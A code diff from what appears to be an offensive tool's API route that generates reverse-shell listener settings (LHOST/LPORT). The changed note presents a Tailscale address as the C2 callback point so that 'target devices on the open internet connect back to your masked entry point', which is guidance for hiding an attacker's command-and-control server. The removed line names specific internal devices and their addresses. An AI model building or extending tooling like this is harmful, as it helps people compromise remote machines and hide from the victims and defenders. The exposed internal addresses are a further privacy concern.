@@ -357,7 +357,7 @@ export async function POST(request: Request) {
         {
           name: "Tailscale (BEST — already installed)",
           command: `LHOST=100.120.150.28 LPORT=${lport}`,
-          note: "Use 100.120.150.28 as LHOST. Works for juniors-s24 (100.105.68.30) and juniors-s25 (100.88.11.81) — they are already on your Tailscale network.",
+          note: "Use your Tailscale IP as LHOST so the C2 callback routes through your encrypted Tailscale mesh — target devices on the open internet connect back to your masked entry point.",
           important: true
         },
       ]
